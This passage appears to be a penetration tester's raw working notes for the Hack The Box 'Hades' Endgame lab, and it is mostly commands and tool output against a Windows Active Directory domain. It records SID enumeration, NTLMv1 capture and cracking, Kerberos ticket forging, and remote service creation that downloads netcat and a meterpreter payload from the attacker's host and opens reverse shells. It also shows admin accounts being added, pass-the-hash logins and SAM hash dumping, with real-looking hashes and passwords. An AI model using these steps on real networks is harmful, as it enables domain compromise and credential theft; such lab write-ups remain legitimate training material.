+          ncacn_ip_tcp:192.168.3.203[49676]
+          ncacn_np:\\DC1[\pipe\0260000ede56e870]
+          ncacn_http:192.168.3.203[49675]
+          ncalrpc:[NTDS_LPC]
+          ncalrpc:[OLE1F196D3368566614E01582270EC8]
+          ncacn_ip_tcp:192.168.3.203[49667]
+          ncalrpc:[samss lpc]
+          ncalrpc:[SidKey Local End Point]
+          ncalrpc:[protected_storage]
+          ncalrpc:[lsasspirpc]
+          ncalrpc:[lsapolicylookup]
+          ncalrpc:[LSA_EAS_ENDPOINT]
+          ncalrpc:[lsacap]
+          ncalrpc:[LSARPC_ENDPOINT]
+          ncalrpc:[securityevent]
+          ncalrpc:[audit]
+          ncacn_np:\\DC1[\pipe\lsass]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 697DCDA9-3BA9-4EB2-9247-E11F1901B0D2 v1.0 
+Bindings: 
+          ncalrpc:[LRPC-76ede2a39b47abddf6]
+          ncalrpc:[LRPC-f222a21550e079f494]
+          ncalrpc:[LRPC-f78e43254ce4a14d5f]
+          ncacn_np:\\DC1[\pipe\LSM_API_service]
+          ncalrpc:[LSMApi]
+          ncalrpc:[LRPC-da1d63850365bf8740]
+          ncalrpc:[actkernel]
+          ncalrpc:[umpo]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : F3F09FFD-FBCF-4291-944D-70AD6E0E73BB v1.0 
+Bindings: 
+          ncalrpc:[LRPC-055f50ca237f8ec535]
+
+Protocol: N/A 
+Provider: MPSSVC.dll 
+UUID    : 2FB92682-6599-42DC-AE13-BD2CA89BD11C v1.0 Fw APIs
+Bindings: 
+          ncalrpc:[LRPC-94210e359554af6265]
+          ncalrpc:[LRPC-ff1e54b3d6edd66795]
+          ncalrpc:[LRPC-d823a13c483e3b771d]
+          ncalrpc:[LRPC-a28c44492b06b19d19]
+
+Protocol: N/A 
+Provider: sysntfy.dll 
+UUID    : C9AC6DB5-82B7-4E55-AE8A-E464ED7B4277 v1.0 Impl friendly name
+Bindings: 
+          ncalrpc:[LRPC-da1d63850365bf8740]
+          ncalrpc:[actkernel]
+          ncalrpc:[umpo]
+          ncalrpc:[senssvc]
+          ncalrpc:[OLEC96926DF76064A1E9EFA72B4AB99]
+          ncalrpc:[IUserProfile2]
+          ncalrpc:[IUserProfile2]
+          ncalrpc:[IUserProfile2]
+          ncalrpc:[OLE1F196D3368566614E01582270EC8]
+          ncacn_ip_tcp:192.168.3.203[49667]
+          ncalrpc:[samss lpc]
+          ncalrpc:[SidKey Local End Point]
+          ncalrpc:[protected_storage]
+          ncalrpc:[lsasspirpc]
+          ncalrpc:[lsapolicylookup]
+          ncalrpc:[LSA_EAS_ENDPOINT]
+          ncalrpc:[lsacap]
+          ncalrpc:[LSARPC_ENDPOINT]
+          ncalrpc:[securityevent]
+          ncalrpc:[audit]
+          ncacn_np:\\DC1[\pipe\lsass]
+
+Protocol: N/A 
+Provider: srvsvc.dll 
+UUID    : 98716D03-89AC-44C7-BB8C-285824E51C4A v1.0 XactSrv service
+Bindings: 
+          ncalrpc:[LRPC-93d0753b0f224f3c9f]
+
+Protocol: [MS-DNSP]: Domain Name Service (DNS) Server Management 
+Provider: dns.exe 
+UUID    : 50ABC2A4-574D-40B3-9D66-EE4FD5FBA076 v5.0 
+Bindings: 
+          ncacn_ip_tcp:192.168.3.203[49709]
+
+Protocol: [MS-EVEN6]: EventLog Remoting Protocol 
+Provider: wevtsvc.dll 
+UUID    : F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C v1.0 Event log TCPIP
+Bindings: 
+          ncacn_ip_tcp:192.168.3.203[49665]
+          ncacn_np:\\DC1[\pipe\eventlog]
+          ncalrpc:[eventlog]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 3473DD4D-2E88-4006-9CBA-22570909DD10 v5.1 WinHttp Auto-Proxy Service
+Bindings: 
+          ncalrpc:[d0e70294-defa-4a79-bce2-39dfea4290ed]
+          ncalrpc:[LRPC-c2e78e7da4d933fe4f]
+          ncalrpc:[dhcpcsvc]
+          ncalrpc:[dhcpcsvc6]
+          ncacn_ip_tcp:192.168.3.203[49665]
+          ncacn_np:\\DC1[\pipe\eventlog]
+          ncalrpc:[eventlog]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 0D3C7F20-1C8D-4654-A1B3-51563B298BDA v1.0 UserMgrCli
+Bindings: 
+          ncalrpc:[LRPC-5bf84be31a674227f6]
+          ncalrpc:[TeredoControl]
+          ncalrpc:[TeredoDiagnostics]
+          ncacn_ip_tcp:192.168.3.203[49666]
+          ncalrpc:[ubpmtaskhostchannel]
+          ncacn_np:\\DC1[\PIPE\atsvc]
+          ncalrpc:[senssvc]
+          ncalrpc:[OLEC96926DF76064A1E9EFA72B4AB99]
+          ncalrpc:[IUserProfile2]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : E38F5360-8572-473E-B696-1B46873BEEAB v1.0 
+Bindings: 
+          ncalrpc:[LRPC-fb56e45dea1f9d8d02]
+
+Protocol: N/A 
+Provider: winlogon.exe 
+UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
+Bindings: 
+          ncalrpc:[WindowsShutdown]
+          ncacn_np:\\DC1[\PIPE\InitShutdown]
+          ncalrpc:[WMsgKRpc0818D0]
+          ncalrpc:[WMsgKRpc082A91]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : D09BDEB5-6171-4A34-BFE2-06FA82652568 v1.0 
+Bindings: 
+          ncalrpc:[csebpub]
+          ncalrpc:[LRPC-76ede2a39b47abddf6]
+          ncalrpc:[LRPC-f222a21550e079f494]
+          ncalrpc:[LRPC-f78e43254ce4a14d5f]
+          ncacn_np:\\DC1[\pipe\LSM_API_service]
+          ncalrpc:[LSMApi]
+          ncalrpc:[LRPC-da1d63850365bf8740]
+          ncalrpc:[actkernel]
+          ncalrpc:[umpo]
+          ncalrpc:[LRPC-f222a21550e079f494]
+          ncalrpc:[LRPC-f78e43254ce4a14d5f]
+          ncacn_np:\\DC1[\pipe\LSM_API_service]
+          ncalrpc:[LSMApi]
+          ncalrpc:[LRPC-da1d63850365bf8740]
+          ncalrpc:[actkernel]
+          ncalrpc:[umpo]
+          ncalrpc:[LRPC-f78e43254ce4a14d5f]
+          ncacn_np:\\DC1[\pipe\LSM_API_service]
+          ncalrpc:[LSMApi]
+          ncalrpc:[LRPC-da1d63850365bf8740]
+          ncalrpc:[actkernel]
+          ncalrpc:[umpo]
+          ncalrpc:[LRPC-b1f8d6bc8cd5c96354]
+          ncalrpc:[d0e70294-defa-4a79-bce2-39dfea4290ed]
+          ncalrpc:[LRPC-c2e78e7da4d933fe4f]
+          ncalrpc:[dhcpcsvc]
+          ncalrpc:[dhcpcsvc6]
+          ncacn_ip_tcp:192.168.3.203[49665]
+          ncacn_np:\\DC1[\pipe\eventlog]
+          ncalrpc:[eventlog]
+
+Protocol: [MS-LSAT]: Local Security Authority (Translation Methods) Remote 
+Provider: lsasrv.dll 
+UUID    : 12345778-1234-ABCD-EF00-0123456789AB v0.0 
+Bindings: 
+          ncacn_np:\\DC1[\pipe\0260000ede56e870]
+          ncacn_http:192.168.3.203[49675]
+          ncalrpc:[NTDS_LPC]
+          ncalrpc:[OLE1F196D3368566614E01582270EC8]
+          ncacn_ip_tcp:192.168.3.203[49667]
+          ncalrpc:[samss lpc]
+          ncalrpc:[SidKey Local End Point]
+          ncalrpc:[protected_storage]
+          ncalrpc:[lsasspirpc]
+          ncalrpc:[lsapolicylookup]
+          ncalrpc:[LSA_EAS_ENDPOINT]
+          ncalrpc:[lsacap]
+          ncalrpc:[LSARPC_ENDPOINT]
+          ncalrpc:[securityevent]
+          ncalrpc:[audit]
+          ncacn_np:\\DC1[\pipe\lsass]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : C36BE077-E14B-4FE9-8ABC-E856EF4F048B v1.0 Proxy Manager client server endpoint
+Bindings: 
+          ncalrpc:[TeredoControl]
+          ncalrpc:[TeredoDiagnostics]
+          ncacn_ip_tcp:192.168.3.203[49666]
+          ncalrpc:[ubpmtaskhostchannel]
+          ncacn_np:\\DC1[\PIPE\atsvc]
+          ncalrpc:[senssvc]
+          ncalrpc:[OLEC96926DF76064A1E9EFA72B4AB99]
+          ncalrpc:[IUserProfile2]
+
+Protocol: N/A 
+Provider: efssvc.dll 
+UUID    : DF1941C5-FE89-4E79-BF10-463657ACF44D v1.0 EFS RPC Interface
+Bindings: 
+          ncacn_np:\\DC1[\pipe\efsrpc]
+          ncalrpc:[LRPC-197fc818c8e864c90c]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : FD8BE72B-A9CD-4B2C-A9CA-4DED242FBE4D v1.0 
+Bindings: 
+          ncalrpc:[LRPC-fb56e45dea1f9d8d02]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 7F1343FE-50A9-4927-A778-0C5859517BAC v1.0 DfsDs service
+Bindings: 
+          ncacn_np:\\DC1[\PIPE\wkssvc]
+          ncalrpc:[LRPC-ac4e08b2f16982bf47]
+          ncalrpc:[DNSResolver]
+
+Protocol: N/A 
+Provider: MPSSVC.dll 
+UUID    : 7F9D11BF-7FB9-436B-A812-B2D50C5D4C03 v1.0 Fw APIs
+Bindings: 
+          ncalrpc:[LRPC-d823a13c483e3b771d]
+          ncalrpc:[LRPC-a28c44492b06b19d19]
+
+[*] Received 317 endpoints.
+
+root@kali:/opt/impacket/examples# proxychains python lookupsid.py 'hades.htb/bob:Passw0rd1!@192.168.3.203'
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Brute forcing SIDs at 192.168.3.203
+[*] StringBinding ncacn_np:192.168.3.203[\pipe\lsarpc]
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:445-<><>-OK
+[*] Domain SID is: S-1-5-21-4266912945-3985045794-2943778634
+498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: HTB\Administrator (SidTypeUser)
+501: HTB\Guest (SidTypeUser)
+502: HTB\krbtgt (SidTypeUser)
+512: HTB\Domain Admins (SidTypeGroup)
+513: HTB\Domain Users (SidTypeGroup)
+514: HTB\Domain Guests (SidTypeGroup)
+515: HTB\Domain Computers (SidTypeGroup)
+516: HTB\Domain Controllers (SidTypeGroup)
+517: HTB\Cert Publishers (SidTypeAlias)
+518: HTB\Schema Admins (SidTypeGroup)
+519: HTB\Enterprise Admins (SidTypeGroup)
+520: HTB\Group Policy Creator Owners (SidTypeGroup)
+521: HTB\Read-only Domain Controllers (SidTypeGroup)
+522: HTB\Cloneable Domain Controllers (SidTypeGroup)
+525: HTB\Protected Users (SidTypeGroup)
+526: HTB\Key Admins (SidTypeGroup)
+527: HTB\Enterprise Key Admins (SidTypeGroup)
+553: HTB\RAS and IAS Servers (SidTypeAlias)
+571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
+572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
+1101: HTB\DnsAdmins (SidTypeAlias)
+1102: HTB\DnsUpdateProxy (SidTypeGroup)
+1103: HTB\Dev (SidTypeGroup)
+1104: HTB\Operations (SidTypeGroup)
+1105: HTB\iis-svc (SidTypeUser)
+1106: HTB\test-svc (SidTypeUser)
+1107: HTB\bob (SidTypeUser)
+1108: HTB\lee (SidTypeUser)
+1109: HTB\kalle (SidTypeUser)
+1110: HTB\WEB$ (SidTypeUser)
+1601: HTB\DEV$ (SidTypeUser)
+2101: HTB\DC1$ (SidTypeUser)
+
+
+
+root@kali:/opt/impacket/examples# proxychains crackmapexec 192.168.3.202
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.202:445-<><>-OK
+CME          192.168.3.202:445 WEB             [*] Windows 6.3 Build 9600 (name:WEB) (domain:HTB)
+[*] KTHXBYE!
+root@kali:/opt/impacket/examples# proxychains crackmapexec 192.168.3.203
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:445-<><>-OK
+CME          192.168.3.203:445 DC1             [*] Windows 10.0 Build 17763 (name:DC1) (domain:HTB)
+[*] KTHXBYE!
+root@kali:/opt/impacket/examples# proxychains crackmapexec 192.168.99.1
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.99.1:445-<><>-OK
+
+CME          192.168.99.1:445 WEB             [*] Windows 6.3 Build 9600 (name:WEB) (domain:HTB)
+[*] KTHXBYE!
+root@kali:/opt/impacket/examples#
+root@kali:/opt/impacket/examples# 192.168.56.1
+bash: 192.168.56.1: command not found
+root@kali:/opt/impacket/examples# proxychains crackmapexec 192.168.56.1
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.56.1:445-<><>-OK
+CME          192.168.56.1:445 WEB             [*] Windows 6.3 Build 9600 (name:WEB) (domain:HTB)
+[*] KTHXBYE!
+
+root@kali:/opt/impacket/examples# proxychains crackmapexec 192.168.3.203 -u 'bob' -p 'Passw0rd1!' --pass-pol
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:445-<><>-OK
+CME          192.168.3.203:445 DC1             [*] Windows 10.0 Build 17763 (name:DC1) (domain:HTB)
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:445-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:445-<><>-OK
+CME          192.168.3.203:445 DC1             [+] HTB\bob:Passw0rd1!
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:445-<><>-OK
+CME          192.168.3.203:445 DC1             [+] Dumping password policy
+CME          192.168.3.203:445 DC1             Minimum password length: 0
+CME          192.168.3.203:445 DC1             Password history length: 0
+CME          192.168.3.203:445 DC1             Maximum password age: Not Set
+CME          192.168.3.203:445 DC1             Minimum password age: None
+CME          192.168.3.203:445 DC1             Account lockout threshold: 0
+CME          192.168.3.203:445 DC1             Account lockout duration: None
+[*] KTHXBYE!
+
+
+
+responder -I tun0 --lm
+
+proxychains python dementor.py -d htb.local -u bob -p Passw0rd1\! 10.14.14.38 192.168.3.201
+
+201 is dev
+
+
+
+
+
+
+
+[+] Listening for events...
+[SMB] NTLMv1 Client   : 10.13.38.17
+[SMB] NTLMv1 Username : HTB\DEV$
+[SMB] NTLMv1 Hash     : DEV$::HTB:DC957B6B58E0E326019B3B201DD3FED22F47CEE96D09C1D3:DC957B6B58E0E326019B3B201DD3FED22F47CEE96D09C1D3:68e44169f9a095f8
+
+python ntlmv1.py --nossp DEV$::HTB:DC957B6B58E0E326019B3B201DD3FED22F47CEE96D09C1D3:DC957B6B58E0E326019B3B201DD3FED22F47CEE96D09C1D3:68e44169f9a095f8
+
+Hashfield Split:
+['DEV$', '', 'HTB', 'DC957B6B58E0E326019B3B201DD3FED22F47CEE96D09C1D3', 'DC957B6B58E0E326019B3B201DD3FED22F47CEE96D09C1D3', '68e44169f9a095f8']
+
+Hostname: HTB
+Username: DEV$
+Challenge: 68e44169f9a095f8
+LM Response: DC957B6B58E0E326019B3B201DD3FED22F47CEE96D09C1D3
+NT Response: DC957B6B58E0E326019B3B201DD3FED22F47CEE96D09C1D3
+CT1: DC957B6B58E0E326
+CT2: 019B3B201DD3FED2
+CT3: 2F47CEE96D09C1D3
+
+To Calculate final 4 characters of NTLM hash use:
+./ct3_to_ntlm.bin 2F47CEE96D09C1D3 68e44169f9a095f8
+
+To crack with hashcat create a file with the following contents:
+DC957B6B58E0E326:68e44169f9a095f8
+019B3B201DD3FED2:68e44169f9a095f8
+
+To crack with hashcat:
+./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
+
+To Crack with crack.sh use the following token
+$NETLM$68e44169f9a095f8$DC957B6B58E0E326019B3B201DD3FED22F47CEE96D09C1D3
+
+
+used crack.sh
+
+
+proxychains python getTGT.py -dc-ip 192.168.3.203 -hashes 513a22889e054d0d20ebc6860b26b740 HTB/DEV
+
+513a22889e054d0d20ebc6860b26b740 HTB/DEV
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+need more than 1 value to unpack
+
+
+
+got DEV.ccache looks like keberos hash
+
+
+
+proxychains crackmapexec smb 192.168.3.201 -d htb.local -u DEV\$ -H 513a22889e054d0d20ebc6860b26b740
+
+
+
+root@kali:/opt/impacket/examples# proxychains crackmapexec 192.168.3.203 -u 'bob' -p 'Passw0rd1!' --ntds vss
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:445-<><>-OK
+CME          192.168.3.203:445 DC1             [*] Windows 10.0 Build 17763 (name:DC1) (domain:HTB)
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:445-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:445-<><>-OK
+CME          192.168.3.203:445 DC1             [+] HTB\bob:Passw0rd1! 
+[*] KTHXBYE!
+
+
+
+ticketer.py -nthash 513a22889e054d0d20ebc6860b26b740 -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -domain HTB DEV\$
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for HTB/DEV$
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncASRepPart
+[*] Saving ticket in DEV$.ccache
+
+
+
+root@kali:/opt/impacket/examples# ticketer.py -nthash 513a22889e054d0d20ebc6860b26b740 -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -domain HTB DEV
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for HTB/DEV
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncASRepPart
+[*] Saving ticket in DEV.ccache
+
+
+export KRB5CCNAME=/root/Documents/HTB/Endgame/Hades/DEV.ccache
+
+
+
+proxychains smbclient \\\\192.168.3.201\\C$ -U DEV -C -N 
+
+
+for got spn 
+
+proxychains python /opt/impacket/examplesgetST.py -spn cifs/WEB@htb.local -dc-ip 192.168.3.203 -hashes :513a22889e054d0d20ebc6860b26b740 HTB/DEV$
+
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for user
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:88-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:88-<><>-OK
+[*] Getting ST for user
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:88-<><>-OK
+[*] Saving ticket in DEV@192.168.3.201.ccache
+
+
+saved with ip it needs to be fixed
+
+
+
+trying to enum
+
+
+root@kali:~/Documents/HTB/Endgame/Hades# proxychains /opt/impacket/examples/wmiexec.py htb/DEV@192.168.3.201 -k -no-pass -dc-ip 192.168.3.203
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.201:445-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:88-<><>-OK
+[-] Kerberos SessionError: KRB_AP_ERR_BAD_INTEGRITY(Integrity check on decrypted field failed)
+
+
+
+ticket didn't work tried for windows managment over CIFS to get shares.
+
+ticketer.py -nthash 513a22889e054d0d20ebc6860b26b740 -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -domain htb.local -spn WSMAN/dev.htb.local DEV
+
+
+also did not work
+
+
+can access share with
+
+proxychains smbclient --pw-nt-hash -W htb.local -U DEV\$ \\\\192.168.3.202\\test
+
+513a22889e054d0d20ebc6860b26b740
+
+
+
+
+ticketer.py -nthash 513a22889e054d0d20ebc6860b26b740 -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -domain htb.local DEV\$
+
+nano /etc/krb5.conf
+
+[realms]
+        HTB.LOCAL = {
+                kdc = dev.htb.local
+                kdc = web.htb.local
+                kdc = dc.htb.local
+                admin_server = dc.htb.local  
+        }
+
+
+top line
+HTB.LOCAL
+then use -k in impacket modules and it will authenticate
+
+proxychains python /opt/impacket/examples/getST.py -spn cifs/dev.htb.local -dc-ip 192.168.3.203 -hashes :513a22889e054d0d20ebc6860b26b740 HTB/DEV\$
+
+export KRB5CCNAME=/root/Documents/HTB/Endgame/Hades/'DEV$.ccache'
+
+DIDNT WORK SO I MADE ONE:
+
+
+proxychains python ticketer.py -nthash 513a22889e054d0d20ebc6860b26b740 -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -domain htb.local -spn cifs/192.168.3.201 remote_user
+
+
+
+export KRB5CCNAME=/root/Documents/HTB/Endgame/Hades/remote_user.ccache
+
+
+
+root@kali:~/Documents/HTB/Endgame/Hades# proxychains python /opt/impacket/examples/services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 create -name test_user -display test_user -path 'net user xtc Password56@ /add'
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.201:445-<><>-OK
+[*] Creating service test_user
+
+
+
+proxychains services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 config -name test_user
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.201:445-<><>-OK
+[*] Querying service config for test_user
+TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS
+START_TYPE        :  2 -  AUTO START
+ERROR_CONTROL     :  0 -  IGNORE
+BINARY_PATH_NAME  : net user xtc Password56@ /add
+LOAD_ORDER_GROUP  :
+TAG               : 0
+DISPLAY_NAME      : test_user
+DEPENDENCIES      : /
+SERVICE_START_NAME: LocalSystem
+ 
+
+root@kali:~/Documents/HTB/Endgame/Hades# proxychains python /opt/impacket/examples/services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 start -name test_user 
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.201:445-<><>-OK
+[*] Starting service test_user
+[-] SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
+
+
+upload nc on the box 
+
+proxychains services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 create -name sa -display sa -path 'curl http://10.14.15.228:80/nc.exe -o C:\\Windows\\Tasks\\nc.exe'
+
+
+proxychains services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 create -name xtc -display xtc -path 'C:\\Windows\\Tasks\\nc.exe -e cmd.exe 10.14.15.228 9337'
+
+proxychains python /opt/impacket/examples/services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 start -name xtc
+
+
+got a shell
+
+C:\Users\Administrator\Desktop>type flag.txt
+type flag.txt
+HADES{Sp0ol_SeRv1ce_sO_Brok3n}
+
+
+
+
+ruby evil-winrm.rb -u administrator -H 67bb396c79f56301b7dc5d219cc85d86 -i 10.13.38.17
+
+proxychains ruby evil-winrm.rb -u administrator -H 67bb396c79f56301b7dc5d219cc85d86 -i 192.168.3.201
+
+
+
+add user
+
+C:\Windows\system32>net user /add test_user Imnotarobot1!
+
+net user /add test_user Imnotarobot1!
+
+The command completed successfully.
+
+
+and make admin
+
+C:\Windows\system32>net localgroup administrators test_user /add
+net localgroup administrators test_user /add
+The command completed successfully.
+
+
+enable winrm external to stop pivoting 
+
+Enable-PSRemoting -Force -SkipNetworkProfileCheck
+
+ruby evil-winrm.rb -i 10.13.38.17 -U /wsman -u test_user -p Imnotarobot!
+
+
+
+password for dev is `syW!g!gDC5n*Y/S(sOo[$P$7Fz:]6X+;10?U'InUh^<bq%n4VwRA\JeB,7fV'CCw!Bbza6-ODX$2zBt";FNJRAJcyQ#0'On$c#-07(Y-\SS.S$_ v,dL
+
+
+
+
+root@kali:/opt/impacket/examples# msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' LHOST=10.14.15.228 LPORT=9339 -n 100 -f exe -o /root/Documents/HTB/Endgame/Hades/xtc.exe
+
+
+proxychains services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 create -name xtcmet -display xtcmet -path 'curl http://10.14.15.228:80/xtc.exe -o C:\\Windows\\Tasks\\xtc.exe'
+
+
+
+root@kali:/opt/impacket/examples# proxychains services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 start -name xtcmet
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.201:445-<><>-OK
+[*] Starting service xtcmet
+[-] SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
+
+but it hit my python server and downloaded
+
+
+make service to start it 
+
+proxychains services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 create -name xtcmetstart -display xtcmetstart -path 'C:\\Windows\\Tasks\\xtc.exe'
+
+proxychains services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 start -name xtcmetstart 
+
+
+msf5 exploit(multi/handler) > exploit -jz
+[*] Exploit running as background job 14.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.14.15.228:9339 
+msf5 exploit(multi/handler) > [*] Sending stage (206403 bytes) to 10.13.38.17
+
+msf5 exploit(multi/handler) > [*] Meterpreter session 15 opened (10.14.15.228:9339 -> 10.13.38.17:49940) at 2019-10-20 11:29:53 -0400
+[*] 10.13.38.17 - Meterpreter session 15 closed.  Reason: Died
+
+
+
+keeps dieing
+
+used winrm and impacket dumped hashes for admin used those
+
+got rdp
+
+xfreerdp /u:administrator /pth:67bb396c79f56301b7dc5d219cc85d86 /v:10.13.38.17:3389
+
+and shell
+
+python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:67bb396c79f56301b7dc5d219cc85d86 administrator@10.13.38.17
+
+
+can also use for my own user but people keep resetting the box
+xfreerdp /u:test_user /p:Imnotarobot1! /v:10.13.38.17:3389
+
+
+some one disabled winrm from the outside: 
+
+*Evil-WinRM* PS C:\Users\test_user\Documents> winrm enumerate winrm/config/listener
+Listener
+    Address = *
+    Transport = HTTP
+    Port = 5985
+    Hostname
+    Enabled = true
+    URLPrefix = wsman
+    CertificateThumbprint
+    ListeningOn = 10.13.38.17, 127.0.0.1, 192.168.3.201, ::1, fe80::1561:359a:e251:3611%4
+
+
+
+
+
+pivoted 
+
+proxychains evil-winrm -i 192.168.3.201 -U /wsman -u test_user -p Imnotarobot1!
+
+
+went for shadow copy
+
+post/windows/manage/vss_list
+
+post/windows/manage/vss_mount
+
+mklink /d C:\DD \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: de53e322ea95ac2723a2e3e149874aac
+
+
+
+password got from the sam
+with secretsdump
+./*40ra26AZ
+
+de53e322ea95ac2723a2e3e149874aac:./*40ra26AZ
+
+curl --negotiate -u 'Administrator:./*40ra26AZ' http://192.168.3.202/
+My shell hangs
+
+
+lsadump::sam /system:C:\DD\Windows\System32\config\system /sam:C:\DD\Windows\System32\config\sam
+
+
+mounted test folder in web
+
+
+for ip in `cat 192_ips.txt`; do for user in `cat users.txt`; do proxychains crackmapexec smb $ip -d htb.local -u $user -p './*40ra26AZ'; done; done 
+
+
+nothing using smb
+
+mklink /d C:\Windows\TAsks\asd  \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+2 slashes at the beginning of vss name
+
+dir /s flag triggered a recursive search
+C:\Windows\Tasks\asd\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\bb\Documents and Settings\All Users\Application Data\bb\Users\Administrator\Desktop
+
+no flag
+
+ Directory of C:\DD\Users\All Users
+
+10/21/2019  05:29 PM    <DIR>          .
+10/21/2019  05:29 PM    <DIR>          ..
+09/03/2019  09:07 PM    <JUNCTION>     Application Data [C:\ProgramData]
+10/21/2019  05:29 PM    <SYMLINKD>     bb [\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\]
+
+
+output of secretsdump
+secretsdump.py -system ./SYSTEM -sam ./SAM -security ./SECURITY LOCAL
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Target system bootKey: 0xe4b2298c95677ce18cd2198b9a36c7df
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:de53e322ea95ac2723a2e3e149874aac:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
